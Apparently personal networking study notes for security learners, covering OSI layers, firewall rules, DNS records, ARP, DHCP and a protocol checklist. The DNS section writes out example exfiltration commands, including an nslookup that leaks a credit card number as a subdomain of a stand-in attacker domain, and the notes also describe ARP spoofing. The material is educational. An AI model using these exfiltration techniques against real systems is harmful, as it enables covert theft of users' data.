# Networking 

## OSI Model
	- Application; layer 7 (and basically layers 5 & 6) (includes API, HTTP, etc).
	- Transport; layer 4 (TCP/UDP).
	- Network; layer 3 (Routing).
	- Datalink; layer 2 (Error checking and frame synchronisation).
	- Physical; layer 1 (Bits over fibre).	

**Layer 7 - Application**
- Where users/apps interact with the network
- **Examples**: Browser using HTTP/HTTPS, email client using SMTP, DNS queries
- **Data format**: Messages/requests

**Layer 4 - Transport**
- Manages data delivery between applications
- **TCP**: Reliable, ordered (web browsing, file transfers)
- **UDP**: Fast, no guarantees (video streaming, gaming)
- **Uses ports**: 443 for HTTPS, 53 for DNS
- **Data format**: Segments (TCP) or Datagrams (UDP)

**Layer 3 - Network**
- Routes data between different networks
- **IP addresses** identify devices (e.g., 192.168.1.1)
- **Routers** operate here
- **Example**: Packet traveling from your home to Google's servers
- **Data format**: Packets

**Layer 2 - Datalink**
- Communication on the same local network
- **MAC addresses** (physical addresses)
- **Switches** operate here
- **Example**: Laptop → Router via WiFi
- **Error detection** via checksums
- **Data format**: Frames

**Layer 1 - Physical**
- Actual transmission medium
- **Signals**: Electrical, light pulses, radio waves
- **Medium**: Cables, fiber, WiFi frequencies
- **Example**: Ethernet cable, fiber optic line

**Flow Example**
You visit google.com:
- DNS query (**Layer 7**)
- TCP connection (**Layer 4**)
- IP packet to 8.8.8.8 (**Layer 3**)
- Ethernet frame to router (**Layer 2**)
- Electrical signals on cable (**Layer 1**)

---

## Firewalls
	- Rules to prevent incoming and outgoing connections.	

**Basic Concept**
Gatekeeper that inspects traffic and allows/blocks based on rules.  
**Rule evaluation**: Top-to-bottom, first match wins.

**Key Elements**
- **Source/Destination**: IP addresses
- **Ports**: Service identifiers (80=HTTP, 443=HTTPS, 22=SSH)
- **Protocol**: TCP / UDP / ICMP
- **Action**: Allow / Deny

**Example Rule Set**
```
1. ALLOW: Source=10.0.0.5, Dest=ANY, Port=443, Protocol=TCP
   → Admin laptop can browse HTTPS anywhere

2. DENY: Source=ANY, Dest=192.168.1.100, Port=22, Protocol=TCP
   → Block all SSH to production server

3. ALLOW: Source=192.168.1.0/24, Dest=8.8.8.8, Port=53, Protocol=UDP
   → Local network can use Google DNS

4. DENY: Source=ANY, Dest=ANY, Port=ANY, Protocol=ANY
   → Default deny everything else
```

**Real Scenario**
Employee tries to SSH to server (192.168.1.100):
- Checks Rule 1: No (wrong port)
- Checks Rule 2: **Match** → **DENIED**
- Stops checking (first match wins)

**Stateful vs Stateless**
- **Stateless**: Checks each packet independently
- **Stateful**: Remembers connections (if you requested something, response is auto-allowed)

---

## NAT 
	- Useful to understand IPv4 vs IPv6.
  - IPv4 address conservation is called NAT, IPv6 does not require NAT, 340 undec 

---

## DNS
	- (53)
	- Requests to DNS are usually UDP, unless the server gives a redirect notice asking for a TCP connection. Look up in cache happens first. DNS exfiltration. Using raw IP addresses means no DNS logs, but there are HTTP logs. DNS sinkholes.
	- In a reverse DNS lookup, PTR might contain- 2.152.80.208.in-addr.arpa, which will map to  208.80.152.2. DNS lookups start at the end of the string and work backwards, which is why the IP address is backwards in PTR.

**Basic Concept**
Translates domain names to IP addresses (like a phone book for the internet).

**How It Works**
1. You type: `google.com`
2. Check local cache first
3. If not found → Query DNS server (Port 53, UDP)
4. DNS responds: `142.250.185.46`
5. Browser connects to that IP

**Example Query Flow**
```
google.com → Root server → .com server → Google's nameserver → 142.250.185.46
```

**UDP vs TCP**
- **UDP (default)**: Fast, single packet
- **TCP**: Used if response >512 bytes or for zone transfers

**Reverse DNS (PTR)**
- **Forward**: `google.com → 142.250.185.46`
- **Reverse**: `208.80.152.2 → 2.152.80.208.in-addr.arpa → wikipedia.org`
- IP reversed because DNS reads right-to-left

**Security Relevance**

**DNS Exfiltration**
Attacker steals data via DNS queries:
```
Query: stolen-password-abc123.attacker.com
Attacker's DNS server logs the subdomain = exfiltrated data
```

**Bypassing DNS Logs**
```
curl http://142.250.185.46
```
- No DNS query → No DNS logs  
- But HTTP logs still show the IP connection

**DNS Sinkhole**
Redirect malicious domains to dead-end:
```
malware.com → 0.0.0.0 (blocked)
```

- DNS exfiltration 
	- Sending data as subdomains. 
	- 26856485f6476a567567c6576e678.badguy.com
	- Doesn’t show up in http logs. 

DNS Exfiltration Example

**Scenario**
1. Attacker compromised Person A's computer via malware.
2. Malware finds credit card: `4532123456789010` stored in a file.
3. Attacker needs to **get this data OUT** to their own server.
4. HTTP is monitored, file transfers blocked.

**Solution - DNS Exfiltration**
```
Malware on Person A's PC runs:
nslookup 4532123456789010.exfil.badguy.com

This DNS query goes to attacker's DNS server (badguy.com)

Attacker's DNS server logs show:
"Query received for: 4532123456789010.exfil.badguy.com"
```

**What attacker gets**
The credit card number `4532123456789010` (extracted from the subdomain in their logs).

**The Trick**
- Data travels **inside the DNS query itself** (as subdomain).
- Not in the DNS response.
- Attacker doesn't care about DNS answer.
- Just needs the query to reach their server so they can log it.

**Analogy**
Like writing a secret message on the outside of an envelope, then mailing it to yourself.  
You don't care what's inside the envelope — the message **IS the address**.

---

## DNS configs
	- Start of Authority (SOA).
	- IP addresses (A and AAAA).
	- SMTP mail exchangers (MX).
	- Name servers (NS).
	- Pointers for reverse DNS lookups (PTR).
	- Domain name aliases (CNAME).


# DNS Record Types

**SOA (Start of Authority)**
Metadata about the domain — who’s responsible, refresh intervals.
```
example.com SOA ns1.example.com admin.example.com
Serial: 2024120201
Refresh: 3600 (check for updates every hour)
```

**A Record (IPv4)**
Fullform - Address Record
Domain → IPv4 address.
```
google.com → 142.250.185.46
mail.company.com → 203.0.113.10
```

**AAAA Record (IPv6)**
Domain → IPv6 address.
```
google.com → 2607:f8b0:4004:c07::71
```

**MX (Mail Exchanger)**
Where to send emails for this domain.
```
company.com MX priority=10 mail.company.com
If you email user@company.com, goes to mail.company.com
```

**NS (Name Server)**
Which DNS servers handle this domain.
```
example.com NS ns1.cloudflare.com
example.com NS ns2.cloudflare.com
```

**PTR (Pointer - Reverse DNS)**
IP → Domain name.
```
208.80.152.2 → 2.152.80.208.in-addr.arpa → wikipedia.org

Email Security: Receiving mail servers check PTR records to ensure the sending IP matches the domain name, flagging emails from misconfigured servers as potential spam.
Authentication: Helps prevent fraudulent emails by verifying the origin of messages.
Troubleshooting: Aids network administrators in identifying hosts and tracing connections.
Setup: Created by your IP address provider (often your hosting company) in the reverse DNS zone, requiring a corresponding A record for the IP first.

in-addr.arpa Explained
What it is: A special, reserved Top-Level Domain (TLD) in the DNS hierarchy used specifically for reverse lookups of IPv4 addresses.
Origin: Comes from ARPA (Advanced Research Projects Agency), an early precursor to the Internet.
Management: Not directly managed by users; IP blocks are delegated to ISPs or organizations, who then manage their respective in-addr.arpa subdomains 
```

**CNAME (Alias)**
Canonical Domain
Point one domain to another.
```
www.example.com CNAME example.com
blog.example.com CNAME hosting-provider.com
Both redirect to target domain
```

**Real Setup Example**
```
example.com A 203.0.113.50
www.example.com CNAME example.com
mail.example.com A 203.0.113.51
example.com MX 10 mail.example.com
```

---

- ARP
	- Pair MAC address with IP Address for IP connections.


### ARP (Address Resolution Protocol)

#### Basic Concept
- ARP finds the **MAC address** when you only know the **IP address**.
- Required because **Layer 2 (Ethernet)** uses MAC addresses, not IPs.

#### How It Works
Your PC (`192.168.1.10`) wants to talk to the Router (`192.168.1.1`), but Ethernet needs the **MAC address** to send the frame.
1. **PC broadcasts:** Who has 192.168.1.1? Tell 192.168.1.10
2. **Router responds:** 192.168.1.1 is at MAC aa:bb:cc:dd:ee:ff
3. **PC caches** this mapping (ARP cache/table)
4. **PC sends data** using that MAC address

#### Example
ARP Request (broadcast to everyone):
Who has IP 192.168.1.50?

Device at 192.168.1.50 replies:
I'm 192.168.1.50, my MAC is 00:1A:2B:3C:4D:5E

Now you can send Ethernet frames to 00:1A:2B:3C:4D:5E.

#### ARP Cache (stored mappings)
192.168.1.1   → aa:bb:cc:dd:ee:ff   (Router)
192.168.1.50  → 00:1A:2B:3C:4D:5E   (Laptop)

#### Security Issue – ARP Spoofing
- Attacker sends fake ARP reply:
192.168.1.1 is at ATTACKER-MAC
- Your PC updates cache → sends traffic to attacker instead of router  
**Result:** Man-in-the-middle attack**Result:** Man-in-the-middle attack.

#### View ARP Cache

---


- DHCP
	- UDP (67 - Server, 68 - Client)
	- Dynamic address allocation (allocated by router).
	- `DHCPDISCOVER` -> `DHCPOFFER` -> `DHCPREQUEST` -> `DHCPACK`


### DHCP (Dynamic Host Configuration Protocol)

#### Basic Concept
- Automatically assigns IP addresses to devices on a network.
- No manual configuration needed.

#### 4-Step Process (DORA)
1. **DHCPDISCOVER (Client broadcasts):**
   - New laptop connects to WiFi
   - Broadcasts: "I need an IP address! Any DHCP server here?"

2. **DHCPOFFER (Server responds):**
   - DHCP server: "I can offer you 192.168.1.100
     Also: subnet mask 255.255.255.0, gateway 192.168.1.1, DNS 8.8.8.8"

3. **DHCPREQUEST (Client accepts):**
   - Laptop broadcasts: "I accept 192.168.1.100 from this server"
   - (Broadcast so other servers know)

4. **DHCPACK (Server confirms):**
   - Server: "Confirmed! 192.168.1.100 is yours for 24 hours (lease time)"

#### What You Get
- IP address: 192.168.1.100
- Subnet mask: 255.255.255.0
- Default gateway: 192.168.1.1
- DNS servers: 8.8.8.8, 8.8.4.4
- Lease duration: 24 hours

#### Real Example
- Phone joins home WiFi
- DISCOVER → Router offers 192.168.0.50
- REQUEST → Router confirms
- Phone now has working internet config automatically

#### Ports
- Server listens on **67**, Client on **68** (both UDP)

######## Security Risk
Rogue DHCP server can give malicious DNS/gateway


---

- Multiplex 
	- Timeshare, statistical share, just useful to know it exists.


### Multiplexing

#### Basic Concept
- Multiple signals/data streams share one physical medium.
- Saves resources and improves efficiency.

#### Types

##### Time-Division Multiplexing (TDM)
- Each stream gets a time slot.
- Example pattern:
  - Stream A: [uses line] [waits] [uses line] [waits]
  - Stream B: [waits] [uses line] [waits] [uses line]
  - Stream C: [waits] [waits] [uses line] [waits]
- Like 3 people sharing one phone line, taking turns.

##### Statistical Multiplexing
- Bandwidth allocated on-demand (not fixed slots).
- Example:
  - Stream A needs data: gets 60% now.
  - Stream B idle: gets 0%.
  - Stream C needs data: gets 40%.
- Next moment allocations change based on need.
- Used in: Internet traffic, packet switching.

#### Example
Single fiber optic cable carries:
- 100 phone calls (TDM - each gets 1ms every 100ms).
- Internet traffic (Statistical - bandwidth shared dynamically).

#### Why It Matters
- Efficient use of expensive infrastructure (cables, bandwidth


- Traceroute 
	- Usually uses UDP, but might also use ICMP Echo Request or TCP SYN. TTL, or hop-limit.
	- Initial hop-limit is 128 for windows and 64 for *nix. Destination returns ICMP Echo Reply. 

- Nmap 
	- Network scanning tool.
- Intercepts (PitM - Person in the middle)
	- Understand PKI (public key infrastructure in relation to this).
- VPN 
	- Hide traffic from ISP but expose traffic to VPN provider.
- Tor 
	- Traffic is obvious on a network. 
	- How do organised crime investigators find people on tor networks. 
- Proxy  
	- Why 7 proxies won’t help you. 
- BGP
	- Border Gateway Protocol.
	- Holds the internet together.
- Network traffic tools
	- Wireshark
	- Tcpdump
	- Burp suite
- HTTP/S 
	- (80, 443)
- SSL/TLS
	- (443) 
	- Super important to learn this, includes learning about handshakes, encryption, signing, certificate authorities, trust systems. A good [primer](https://english.ncsc.nl/publications/publications/2021/january/19/it-security-guidelines-for-transport-layer-security-2.1) on all these concepts and algorithms is made available by the Dutch cybersecurity center.
	- POODLE, BEAST, CRIME, BREACH, HEARTBLEED.
- TCP/UDP
	- Web traffic, chat, voip, traceroute.
	- TCP will throttle back if packets are lost but UDP doesn't. 
	- Streaming can slow network TCP connections sharing the same network.
- ICMP 
	- Ping and traceroute.
- Mail
	- SMTP (25, 587, 465)
	- IMAP (143, 993)
	- POP3 (110, 995)
- SSH 
	- (22)
	- Handshake uses asymmetric encryption to exchange symmetric key.
- Telnet
	- (23, 992)
	- Allows remote communication with hosts.
- ARP  
	- Who is 0.0.0.0? Tell 0.0.0.1.
	- Linking IP address to MAC, Looks at cache first.
- DHCP 
	- (67, 68) (546, 547)
	- Dynamic (leases IP address, not persistent).
	- Automatic (leases IP address and remembers MAC and IP pairing in a table).
	- Manual (static IP set by administrator).
- IRC 
	- Understand use by hackers (botnets).
- FTP/SFTP 
	- (21, 22)
- RPC 
	- Predefined set of tasks that remote clients can execute.
	- Used inside orgs. 
- Service ports
	- 0 - 1023: Reserved for common services - sudo required. 
	- 1024 - 49151: Registered ports used for IANA-registered services. 
	- 49152 - 65535: Dynamic ports that can be used for anything. 
- HTTP Header
	- | Verb | Path | HTTP version |
	- Domain
	- Accept
	- Accept-language
	- Accept-charset
	- Accept-encoding(compression type)
	- Connection- close or keep-alive
	- Referrer
	- Return address
	- Expected Size?
- HTTP Response Header
	- HTTP version
	- Status Codes: 
		- 1xx: Informational Response
		- 2xx: Successful
		- 3xx: Redirection
		- 4xx: Client Error
		- 5xx: Server Error
	- Type of data in response 
	- Type of encoding
	- Language 
	- Charset
- UDP Header
	- Source port
	- Destination port
	- Length
	- Checksum
- Broadcast domains and collision domains. 
- Root stores
- CAM table overflow
